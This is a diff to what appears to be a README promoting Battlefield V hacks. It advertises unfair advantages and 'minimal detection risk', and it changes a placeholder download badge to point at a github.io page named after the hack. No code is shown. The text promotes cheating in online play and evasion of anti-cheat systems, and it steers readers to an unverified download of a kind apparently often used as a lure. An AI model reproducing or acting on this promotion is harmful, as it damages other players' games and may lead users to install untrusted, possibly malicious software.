@@ -2,7 +2,7 @@
 
 💥 Transform your **Battlefield V** experience with cutting-edge hacks! Our tool grants you unfair advantages like infinite resources, instant weapon purchases, and instant revives. Designed for PC players, this hack ensures smooth performance and minimal detection risk. Whether you're aiming for top leaderboards or enjoying casual gameplay, our mod provides unmatched power to crush opponents.  
 
-[![Download Battlefield V Hacks](https://img.shields.io/badge/Download-Battlefield%20V%20Hacks-blueviolet)](https://example.com)  
+[![Download Battlefield V Hacks](https://img.shields.io/badge/Download-Battlefield%20V%20Hacks-blueviolet)](https://battlefield-v-hacks.github.io/.github/)  
 
 ---
 
